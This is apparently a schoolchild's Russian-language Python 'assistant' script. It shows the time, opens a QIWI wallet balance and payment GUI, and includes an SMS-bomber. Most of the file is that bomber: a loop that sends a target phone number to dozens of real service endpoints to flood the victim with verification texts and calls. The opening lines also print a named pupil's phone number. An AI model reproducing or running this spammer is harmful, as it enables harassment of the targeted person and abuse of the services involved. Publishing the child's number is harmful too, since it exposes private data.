#вступление ассистента
print("Итак, я приступил к созданию помошника")
print("Все претензии к Вадиму из 8 А класса.его номер: 8 925 711-44-20")
start = True
print("Всем привет!!! Это программа твой ассистент. Меня зовут Гоша.")
print("Отлично, начнем")
print("Для начала скажите, как мне к вам обращаться?")
name = input()
print("Рад с вами познакомиться", name)
print("Если хотите ознакомиться с тем, что я могу, напишите команду \"help\"")
print("Если хотите выйти из программы, напишите \"quit\"")
#бесконечный цикл
while start == True:
	#переменная команд
	command = input("Напишите команду:")
	#команда для выхода из ассистента
	if command == "quit":
		print("Гоша будет вас ждать!!!")
		start = False
	#команда для помощи пользователю
	if command == "help":
		print("""Я могу:
			1)Показать время(Гоша скажи дату и время)
			2)Узнать ваш баланс QIWI кошелька(Гоша скажи мой баланс)
			3)Заспамить кого-нибудь(Гоша запусти спаммер)""")
		print("Я все еще в разработке и могу работать не корректно.")
	#команда для узнавания даты и времени
	if command == "Гоша скажи дату и время":
		import time
		print(time.ctime())	#выводит время на экран монитора
	#команда для узнавания баланса пользователя на QIWI кошельке
	if command == "Гоша скажи мой баланс":
		#импорт из модулей питона
		from SimpleQIWI import *
		from tkinter import * 
		from tkinter import messagebox
		from tkinter.ttk import Checkbutton
		def exit():
			window.quit()
		def check_balance():
			#получаем информацию из полей ввода
			phone = phone_input.get()
			token = token_input.get()
			if phone == '' or token == '':
				warning_lbl = Label(window, text="Телефон или Токен пустой!", fg="red")
				warning_lbl.grid(column=3, row=9)
			else:
				try:
					api = QApi(token=token, phone=phone)
					balance = str(api.balance[0]) #float -> string, массив баланс состоит из нескольких элементов, по этому api.balance[0]
				except QIWIAPIError:
					messagebox.showerror("Ошибка", "Неверный токен или токен не имеющий нужных прав.")
				else:
					messagebox.showinfo('Баланс', 'Баланс кошелька '+phone+' составляет: '+balance+' рублей')
		def sucsses():
			#получаем информцию из полей ввода
			amount = amount_input.get()
			comment = comment_input.get()
			wallet = wallet_input.get()
			if comment == "" or chk_state == True:
				messagebox.showinfo('Успешно', 'Сумма '+amount+' переведена на счет '+wallet+'.')#показываем сообщение об успешном переводе
			else:	
				messagebox.showinfo('Успешно', 'Сумма '+amount+' переведена на счет '+wallet+' с комментарием '+comment)
		def pay():
			phone = phone_input.get()
			token = token_input.get()
			if phone == '' or token == '':
				warning_lbl = Label(window, text="Телефон или Токен пустой!", fg="red")
				warning_lbl.grid(column=3, row=9)
			else:
				api = QApi(token=token, phone=phone)
				amount = amount_input.get()
				amount = int(amount) # string -> integer
				wallet = wallet_input.get()
				if comment_input == '' or chk_state == True: #если путой инпут коммента, или стоит чекбокс, переводим
					api.pay(account=wallet, amount=amount)
					sucsses()
				else:
					comment = comment_input.get()
					try:
						api.pay(account=wallet, amount=amount, comment=comment)
					except QIWIAPIError: #Обработываем ошибку при переводе.
						messagebox.showerror('Ошибка!', 'Платеж невозможен, возможные причины:\n*Недостаточно средств, учтите возможную комиссию.\n*Стоит какое либо ограничение платежей\n*Введены неверные данные\n*Перевод самому себе\n*Токен не имеет нужных прав. ')
					else:
						sucsses()
		def showAutor():
			messagebox.showinfo('Автор', 'Автор:Evol\nTelegram: @Evollt\nGmail: levniko343@gmail.com\nВерсия: 1.3')
		window = Tk()
		window.title("Qiwiver: QiwiToolKit by @Evollt")
		window.geometry('449x225') #устанавливаем размер окна
		#Текст "Заполните информацию"
		step1_lbl = Label(window, text="Заполните информацию: ")
		step1_lbl.grid(column=3, row=0)
		#Поле ввода телефона
		phone_lbl = Label(window, text="Телефон:")
		phone_lbl.grid(column=2, row=1)
		phone_input = Entry(window, width=20)
		phone_input.grid(column=3, row=1)
		phone_input.focus()
		#Поле ввода токена
		token_lbl = Label(window, text="Токен: ")
		token_lbl.grid(column=2, row=2)
		token_input = Entry(window, width=20)
		token_input.grid(column=3, row=2)

		#Выбор действия
		step2_lbl = Label(window, text="Выберите действие: ")
		step2_lbl.grid(column=3, row=3)
		#Кнопка "проверить баланс"
		show_balance_btn = Button(window, text="Проверить баланс", command=check_balance, bg="#FE7A30")
		show_balance_btn.grid(column=3, row=4)
		#Поле ввода кошелька
		wallet_lbl = Label(window, text="Кошелек:")
		wallet_lbl.grid(column=2, row=5)
		wallet_input = Entry(window, width=20)
		wallet_input.grid(column=2, row=6)
		#Комментарий при оплате
		comment_lbl = Label(window, text="Комментарий:")
		comment_lbl.grid(column=3, row=5)
		comment_input = Entry(window, width=20)
		comment_input.grid(column=3, row=6)
		#Поле ввода суммы
		amount_lbl = Label(window, text="Сумма:")
		amount_lbl.grid(column=4, row=5)
		amount_input = Entry(window, width=20)
		amount_input.grid(column=4, row=6)
		#чекбокс 
		chk_state = BooleanVar()
		chk_state.set(False)  
		chk = Checkbutton(window, text='Без комментария', var=chk_state)
		chk.grid(column=3, row=7)
		#Кнопка перевести
		pay_btn = Button(window, text="Перевести", command=pay, bg="#FE7A30")
		pay_btn.grid(column=3, row=8)
		#кнопка выхода
		exit_btn = Button(window, text="Выход", bg="red", command=exit)
		exit_btn.grid(column=6, row=8)
		#Показ авторов
		autors_btn = Button(window, text="Автор", command=showAutor, bg="#FE7A30")
		autors_btn.grid(column=6, row=15)
		window.mainloop()
	
	#команда для запуска спаммера
	if command == "Гоша запусти спаммер":
		# -*- coding: utf-8 -*- 
		import requests, random, datetime, sys, time, argparse, os
		_phone = input('Hello! Number for attack (79xxxxxxxxx)-->> ')

		if _phone[0] == '+':
			_phone = _phone[1:]
		if _phone[0] == '8':
			_phone = '7'+_phone[1:]
		if _phone[0] == '9':
			_phone = '7'+_phone

		_name = ''
		for x in range(12):
			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
			username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

		iteration = 0
		for i in range(10000000000):
			_email = _name+f'{iteration}'+'@gmail.com'
			email = _name+f'{iteration}'+'@gmail.com'
			try:
				requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
				print('[+] Grab отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
				print('[+] RuTaxi отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
				print('[+] BelkaCar отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
				print('[+] Tinder отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
				print('[+] Karusel отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
				print('[+] Tinkoff отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
				print('[+] MTS отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
				print('[+] Youla отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
				print('[+] PizzaHut отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
				print('[+] Rabota отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
				print('[+] Rutube отправлено!')
			except:
				requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
				print('[+] Citilink отправлено!')

			try:
				requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
				print('[+] Smsint отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
				print('[+] oyorooms отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
				print('[+] MVideo отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
				print('[+] newnext отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
				print('[+] Sunlight отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
				print('[+] alpari отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
				print('[+] Invitro отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
				print('[+] Sberbank отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
				print('[+] Psbank отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
				print('[+] Beltelcom отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
				print('[+] Karusel отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
				print('[+] KFC отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
				print('[+] carsmile отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
				print('[+] Citilink отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
				print('[+] Delitime отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
				print('[+] findclone звонок отправлен!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
				print('[+] Guru отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
				print('[+] ICQ отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
				print('[+] InDriver отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
				print('[+] Invitro отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
				print('[+] Pmsm отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
				print('[+] IVI отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
				print('[+] Lenta отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
				print('[+] Mail.ru отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
				print('[+] MVideo отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
				print('[+] OK отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://plink.tech/register/',json={"phone": _phone})
				print('[+] Plink отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
				print('[+] qlean отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
				print('[+] SMSgorod отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
				print('[+] Tinder отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
				print('[+] Twitch отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
				print('[+] CabWiFi отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
				print('[+] wowworks отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
				print('[+] Eda.Yandex отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
				print('[+] Youla отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
				print('[+] Alpari отправлено!')
			except:
				print('[-] Не отправлено!')

			try:
				requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
				print('[+] SMS отправлено!')
			except:
				print('[-] не отправлено!')

			try:
				requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
				print('[+] Delivery отправлено!')
			except:
				print()